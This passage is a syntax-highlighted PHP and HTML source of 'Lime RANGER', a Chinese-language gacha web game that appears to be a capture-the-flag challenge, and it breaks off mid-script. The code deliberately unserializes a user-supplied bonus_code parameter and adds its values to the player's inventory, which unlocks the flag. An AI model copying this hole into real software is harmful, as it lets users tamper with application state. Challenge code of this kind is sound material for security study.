class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;view&quot;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>] = <span class="number">4000</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;UR&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;SSR&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;SR&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;R&quot;</span> =&gt; <span class="number">0</span>, <span class="string">&quot;N&quot;</span> =&gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;bonus_code&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&quot;bonus_code&quot;</span>];</span><br><span class="line">    <span class="variable">$new_inv</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$new_inv</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$new_inv</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="variable">$key</span>] += <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;sellacc&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;UR&quot;</span>] + <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;SSR&quot;</span>] &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;<span class="subst">$flag</span>&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;你的帳號不值錢！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$draw_result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;draw1&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>] &lt; <span class="number">40</span>)&#123;</span><br><span class="line">        <span class="variable">$draw_result</span> = <span class="string">&quot;寶石不足！&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>] -= <span class="number">40</span>;</span><br><span class="line">        <span class="variable">$draw_result</span> = <span class="string">&quot;恭喜獲得：&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;、&quot;</span>, <span class="title function_ invoke__">draw</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;draw10&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>] &lt; <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="variable">$draw_result</span> = <span class="string">&quot;寶石不足！&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;balance&quot;</span>] -= <span class="number">200</span>;</span><br><span class="line">        <span class="variable">$draw_result</span> = <span class="string">&quot;恭喜獲得：&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;、&quot;</span>, <span class="title function_ invoke__">draw</span>(<span class="number">6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$n</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">lcg_value</span>();</span><br><span class="line">        <span class="variable">$out</span>[] = <span class="title function_ invoke__">lookup</span>(<span class="variable">$r</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lookup</span>(<span class="params"><span class="variable">$r</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span> &lt;= <span class="number">0.001</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;UR&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UR 極稀有&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="variable">$r</span> &lt;= <span class="number">0.004</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;SSR&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SSR 超級稀有&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="variable">$r</span> &lt;= <span class="number">0.009</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;SR&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;SR 稀有&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="variable">$r</span> &lt;= <span class="number">0.016</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;R&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;R 高級&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;inventory&quot;</span>][<span class="string">&quot;N&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N 普通&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$characterNames</span> = [</span><br><span class="line">    <span class="string">&quot;UR&quot;</span> =&gt; <span class="string">&quot;傳說守護者&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SSR&quot;</span> =&gt; <span class="string">&quot;超級英雄&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SR&quot;</span> =&gt; <span class="string">&quot;精英戰士&quot;</span>,</span><br><span class="line">    <span class="string">&quot;R&quot;</span> =&gt; <span class="string">&quot;勇敢士兵&quot;</span>,</span><br><span class="line">    <span class="string">&quot;N&quot;</span> =&gt; <span class="string">&quot;新手戰士&quot;</span></span><br><span class="line">];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-TW&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Lime RANGER&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;<span class="title">Lime</span> <span class="title">RANGER</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">user</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">balance</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">balance</span>-<span class="title">icon</span>&quot;&gt;💎&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">balance</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">span</span>&gt;你的寶石&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">strong</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">balance</span>&quot;];?&gt;&lt;/<span class="title">strong</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">user</span>-<span class="title">id</span>&quot;&gt;玩家<span class="title">ID</span>: &lt;?=<span class="title">session_id</span>();?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h3</span>&gt;你的角色收藏&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">grid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">item</span> <span class="title">UR</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h4</span>&gt;<span class="title">UR</span>&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">inventory</span>&quot;][&quot;<span class="title">UR</span>&quot;];?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">small</span>&gt;&lt;?=$<span class="title">characterNames</span>[&quot;<span class="title">UR</span>&quot;];?&gt;&lt;/<span class="title">small</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">character</span>-<span class="title">tooltip</span>&quot;&gt;極稀有角色，機率：0.1%&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">item</span> <span class="title">SSR</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h4</span>&gt;<span class="title">SSR</span>&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">inventory</span>&quot;][&quot;<span class="title">SSR</span>&quot;];?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">small</span>&gt;&lt;?=$<span class="title">characterNames</span>[&quot;<span class="title">SSR</span>&quot;];?&gt;&lt;/<span class="title">small</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">character</span>-<span class="title">tooltip</span>&quot;&gt;超級稀有角色，機率：0.3%&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">item</span> <span class="title">SR</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h4</span>&gt;<span class="title">SR</span>&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">inventory</span>&quot;][&quot;<span class="title">SR</span>&quot;];?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">small</span>&gt;&lt;?=$<span class="title">characterNames</span>[&quot;<span class="title">SR</span>&quot;];?&gt;&lt;/<span class="title">small</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">character</span>-<span class="title">tooltip</span>&quot;&gt;稀有角色，機率：0.5%&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">item</span> <span class="title">R</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h4</span>&gt;<span class="title">R</span>&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">inventory</span>&quot;][&quot;<span class="title">R</span>&quot;];?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">small</span>&gt;&lt;?=$<span class="title">characterNames</span>[&quot;<span class="title">R</span>&quot;];?&gt;&lt;/<span class="title">small</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">character</span>-<span class="title">tooltip</span>&quot;&gt;高級角色，機率：0.7%&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inventory</span>-<span class="title">item</span> <span class="title">N</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h4</span>&gt;<span class="title">N</span>&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">_SESSION</span>[&quot;<span class="title">inventory</span>&quot;][&quot;<span class="title">N</span>&quot;];?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">small</span>&gt;&lt;?=$<span class="title">characterNames</span>[&quot;<span class="title">N</span>&quot;];?&gt;&lt;/<span class="title">small</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">character</span>-<span class="title">tooltip</span>&quot;&gt;普通角色，機率：98.4%&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">buttons</span>&quot; <span class="title">method</span>=&quot;<span class="title">GET</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">draw1</span>&quot; <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">button</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                單抽</span></span><br><span class="line"><span class="class">                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">cost</span>&quot;&gt;消耗40寶石&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">draw10</span>&quot; <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">button</span> <span class="title">premium</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                5+1連抽</span></span><br><span class="line"><span class="class">                &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">cost</span>&quot;&gt;消耗200寶石&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">sellacc</span>-<span class="title">container</span>&quot; <span class="title">method</span>=&quot;<span class="title">GET</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">sellacc</span>&quot; <span class="title">class</span>=&quot;<span class="title">draw</span>-<span class="title">button</span> <span class="title">sellacc</span>-<span class="title">button</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                出售帳號</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bonus</span>-<span class="title">section</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h3</span>&gt;活動獎勵&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span>&gt;輸入獎勵碼以領取額外角色&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">GET</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">bonus_code</span>&quot;<span class="title">size</span>=&quot;80&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;領取獎勵&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span>($<span class="title">draw_result</span>): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">result</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span>&gt;抽獎結果&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">draw_result</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">footer</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">span</span>&gt;© 2025 <span class="title">Lime</span> <span class="title">RANGER</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">view</span>&quot; <span class="title">class</span>=&quot;<span class="title">source</span>-<span class="title">link</span>&quot;&gt;查看源碼&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">function</span> <span class="title">createSparkles</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="variable constant_">items</span> = document.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;.inventory-item.UR, .inventory-item.SSR&#x27;</span>);</span><br><span class="line">            items.<span class="title function_ invoke__">forEach</span>(item =&gt; &#123;</span><br><span class="line">                <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">sparkle</span> = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">                    sparkle.classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;sparkle&#x27;</span>);</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">posX</span> = Math.<span class="title function_ invoke__">random</span>() * <span class="number">100</span>;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">posY</span> = Math.<span class="title function_ invoke__">random</span>() * <span class="number">100</span>;</span><br><span class="line">                    sparkle.style.left = `$&#123;posX&#125;%`;</span><br><span class="line">                    sparkle.style.top = `$&#123;posY&#125;%`;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">size</span> = <span class="number">3</span> + Math.<span class="title function_ invoke__">random</span>() * <span class="number">3</span>;</span><br><span class="line">                    sparkle.style.width = `$&#123;size&#125;px`;</span><br><span class="line">                    sparkle.style.height = `$&#123;size&#125;px`;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">hue</span> = item.classList.<span class="title function_ invoke__">contains</span>(<span class="string">&#x27;UR&#x27;</span>) ? <span class="string">&#x27;45&#x27;</span> : <span class="string">&#x27;210&#x27;</span>;</span><br><span class="line">                    sparkle.style.background = `<span class="title function_ invoke__">hsl</span>($&#123;hue&#125;, <span class="number">100</span>%, <span class="number">75</span>%)`;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">duration</span> = <span class="number">1</span> + Math.<span class="title function_ invoke__">random</span>() * <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">const</span> <span class="variable constant_">delay</span> = Math.<span class="title function_ invoke__">random</span>() * <span class="number">2</span>;</span><br><span class="line">                    sparkle.style.animation = `sparkle $&#123;duration&#125;s infinite $&#123;delay&#125;s`;</span><br><span class="line">                    item.<span class="title function_ invoke__">appendChild</span>(sparkle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        window.<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, () =&gt; &#123;</span><br><span class="line">            <span class="title function_ invoke__">createSparkles</span>();</span><br><span class="line">            <span class="keyword">const</span> <span class="variable constant_">buttons</span> = document.<span class="title function_ invoke__">querySelectorAll</span>(<span class="string">&#x27;.draw-button&#x27;</span>);</span><br><span class="line">            buttons.<span class="title function_ invoke__">forEach</span>(button =&gt; &#123;</span><br><span class="line">                button.<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, function()&#123;</span><br><span class="line">                    this.style.transform = <span 